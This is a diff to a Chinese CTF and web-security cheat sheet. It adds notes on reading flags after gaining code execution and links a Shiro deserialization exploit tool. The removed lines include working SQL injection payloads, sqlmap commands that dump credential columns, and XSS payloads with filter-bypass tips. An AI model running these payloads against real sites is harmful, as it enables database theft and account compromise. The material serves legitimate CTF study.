@@ -21,6 +21,11 @@
 * Burpsuite
 * sqlmap
 
+### RCE拿到shell之后
+* `cat flag`
+* `./flag`执行可执行文件拿到flag
+
+
 ### 网页信息查找
 #### 敏感文件
 * `robots.txt`
@@ -50,65 +55,8 @@
 
 
 
-
-### SQL注入
-#### sql基础
-* RDBMS关系型数据库管理系统 库-表-列-行
-#### 有回显
-* `SELECT first_name, last_name FROM users WHERE user_id = '` +`1' or '1234' = '1234` + `'` 有趣的事情发生了，这条注入后的查询语句可以查询所有id的用户
-* `...` + `1' or 1=1 order by 3 #` + `'`猜解sql查询语句中的字段数,巧妙地使注入符合语法，以字段3排序，若失败则只有3-1=2列
-* `1' union select 1,2 #` 联合查询
-* `1' union select 1,database() #` 查询数据库名 
-* `1' union selcet 1, group_concat(table_name) from information_schema.tables where table_schema=database() #` 查询当前数据库的表名
-* `1'and 1=2 union selcet 1,group_concat(column_name) from information_schema.columns where table_name='users' #` 获取表中字段名，1=2使第一个查询失效，或者使用limit
-* `1'and 1=2 union selcet group_concat(user_id, first_name, last_name),group_concat(password) from users #` 查询数据
-
-* 报错注入构造错误信息获取内容
-  * xpath
-  * extractvalue()
-#### sqlmap
-* `sqlmap -h` 帮助文档
-* `sqlmap -u http://xxx.com/1.php?id＝11 --dbs` 查看数据库名
-* `sqlmap -u http://xxx.com/1.php?id＝11 --current-db` 当前数据库信息
-* `sqlmap -u http://xxx.com/1.php?id＝11 -D a --tables` 当前数据库信息，'a' 为指定数据库名称
-* `sqlmap -u http://xxx.com/1.php?id＝11 -D a -T admin --columns` 列出指定表名的所有列名，'admin' 为指定表名称
-* `sqlmap -u http://xxx.com/1.php?id＝11 -D a -T admin -C name,password --dump` 输出表名指定列名字段的值数据，'name，password' 为指定字段名称
-
-#### 无回显
-* 布尔盲注-回显不同
-* 时间盲注-响应时间不同
-* 报错盲注
- 
-
-
-### XSS跨站脚本攻击
-* Cross-site Scripting (XSS)，攻击者注入恶意脚本代码payload，用户访问网页时自动加载
-#### 反射型XSS
-* 见框插入JS代码`<script>alert("Hello")</script>`
-* 大小写绕过
-* 双写绕过
-* 其它标签绕过img
-#### 存储型XSS
-* 多见于评论区注入，因其存储在服务器数据库中，导致持久存在
-* htmlspecialchars()过滤
-
-#### DOM型XSS
-* JS操作document，重构DOM树
-
-#### 操作
-* XSS探针测试过滤的字符
-* 查看源代码如何闭合标签和属性
-* 构建XSS payload绕过检测
-
-#### cookie窃取
-* xss接收平台
-
 ### CSRF跨站请求伪造
 * CSRF，全名 Cross Site Request Forgery，跨站请求伪造
-
-### SSRF服务端请求伪造
-* SSRF，Server-Side Request Forgery，服务端请求伪造
-
 
 
 
@@ -172,3 +120,7 @@
 
 ### FTP后门
 * msf查看版本号获取漏洞代码
+
+### shiro框架漏洞
+* Apache Shiro 是一个Java安全框架
+* [shiro反序列化漏洞利用工具](https://github.com/j1anFen/shiro_attack)
